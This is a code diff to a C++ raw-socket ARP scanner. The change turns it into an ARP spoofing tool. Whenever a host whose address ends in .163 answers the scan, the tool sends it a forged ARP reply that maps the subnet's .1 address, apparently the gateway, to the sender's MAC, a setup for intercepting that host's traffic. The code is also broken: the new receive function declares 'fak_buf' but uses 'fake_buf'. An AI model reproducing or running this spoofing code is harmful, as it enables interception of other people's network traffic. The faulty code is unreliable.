@@ -94,9 +94,8 @@ void print_result(unsigned char* dst_ip, unsigned char* mac) {
 }
 
 int finish_scan = 0;
-char src_ip[4];
 
-void arpscan_recv(int sock_r) {
+void arpscan_recv(int sock_r, char* src_ip, char* fak_buf, struct sockaddr_ll send_addr) {
 	struct timeval tv = { 1, 0 };
 	if (setsockopt(sock_r, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
 		cout << "Error on recv_socket!\n";
@@ -124,13 +123,24 @@ void arpscan_recv(int sock_r) {
 		if (!ok) continue;
 
 		print_result(rbuf + 28, rbuf + 22);
-	
+
+		if (rbuf[31] != 163) continue;
+
+		struct ether_header* eth_header = (struct ether_header*)(fake_buf);
+		struct ether_arp* arp_packet = (struct ether_arp*) (fake_buf + ETHER_HEADER_LEN);
+		memcpy(eth_header -> ether_dhost, rbuf + 22, ETH_ALEN);
+		memcpy(arp_packet -> arp_tha, rbuf + 22, ETH_ALEN);
+		memcpy(arp_packet -> arp_tpa, rbuf + 28, IP_ADDR_LEN);
+
+
+		if (sendto(sock_r, fak_buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr*) &send_addr, sizeof(send_addr)) < 0) {
+			cout << "Sendto Error!\n";	
+		}
 	}
 }
 
-int main(int argc, char const *argv[]) {
-
-    cout << "Avalible devices:\n";    
+void arp_scan() {
+	cout << "Avalible devices:\n";    
     cout << "--------------------------------------\n";
     cout << "IP                MAC                 \n";    
     cout << "--------------------------------------\n";
@@ -138,31 +148,46 @@ int main(int argc, char const *argv[]) {
 	unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
 	unsigned char src_mac_addr[ETH_ALEN];
 	struct in_addr src_in_addr, dst_in_addr;
-	char dst_ip[4];
+	char dst_ip[4], src_ip[4], rot_ip[4];
+	
 	int index;
-	
 	getInfo(src_ip, src_mac_addr, index);
-	for (int i = 0; i < 3; i++) dst_ip[i] = src_ip[i];
+	for (int i = 0; i < 3; i++) {
+		dst_ip[i] = src_ip[i];
+		rot_ip[i] = src_ip[i];
+	}
+	rot_ip[3] = 1;
 
-	char buf[ETHER_ARP_PACKET_LEN];
+	char buf[ETHER_ARP_PACKET_LEN], fak[ETHER_ARP_PACKET_LEN];
 	memset(buf, 0, sizeof(buf));
-	
+
+	// Layer 2	
 	struct ether_header* eth_header = (struct ether_header*) buf;
-	memcpy(eth_header -> ether_shost, src_mac_addr, ETH_ALEN);
 	memcpy(eth_header -> ether_dhost, dst_mac_addr, ETH_ALEN);
+	memcpy(eth_header -> ether_shost, src_mac_addr, ETH_ALEN);
 	eth_header -> ether_type = htons(ETHERTYPE_ARP);	
 
-	struct ether_arp* arp_packet = (struct ether_arp*) malloc(ETHER_ARP_LEN);
 
+	// ARP
+	struct ether_arp* arp_packet = (struct ether_arp*) malloc(ETHER_ARP_LEN);
 	arp_packet -> arp_hrd = htons(ARPHRD_ETHER);
 	arp_packet -> arp_pro = htons(ETHERTYPE_IP);
 	arp_packet -> arp_hln = ETH_ALEN;
 	arp_packet -> arp_pln = IP_ADDR_LEN;
 	arp_packet -> arp_op  = htons(ARPOP_REQUEST);
-
 	memcpy(arp_packet -> arp_sha, src_mac_addr, ETH_ALEN);
 	memcpy(arp_packet -> arp_tha, dst_mac_addr, ETH_ALEN);
 	memcpy(arp_packet -> arp_spa, src_ip, IP_ADDR_LEN);
+	memcpy(arp_packet -> arp_tpa, dst_ip, IP_ADDR_LEN);
+	memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);
+
+
+	// Fake ARP reply
+    memcpy(fak, buf, ETHER_ARP_PACKET_LEN);  
+    struct ether_arp* arp_packet_fake = (struct ether_arp*) (fak + ETHER_HEADER_LEN);
+    arp_packet_fake -> arp_op  = htons(ARPOP_REPLY);
+    memcpy(arp_packet_fake -> arp_spa, rot_ip, IP_ADDR_LEN);
+
 
 	// Sockaddr
 	struct sockaddr_ll send_addr;
@@ -174,11 +199,10 @@ int main(int argc, char const *argv[]) {
     send_addr.sll_halen = 0x06;
     memset(send_addr.sll_addr, 0xff, 6);
 
-
 	int sock_r;
 	socket_init(sock_r);
 
-    thread recevier(arpscan_recv, sock_r);
+    thread recevier(arpscan_recv, sock_r, src_ip, fak, send_addr);
     for (int i = 2; i < 254; i++) {
 		dst_ip[3] = i;
 		memcpy(arp_packet -> arp_tpa, dst_ip, IP_ADDR_LEN);
@@ -193,7 +217,13 @@ int main(int argc, char const *argv[]) {
 	finish_scan = 1;
 	recevier.join();
 
-
 	close(sock_r);
+}
+
+int main(int argc, char const *argv[]) {
+
+	arp_scan();
+
+
     return 0;
 }
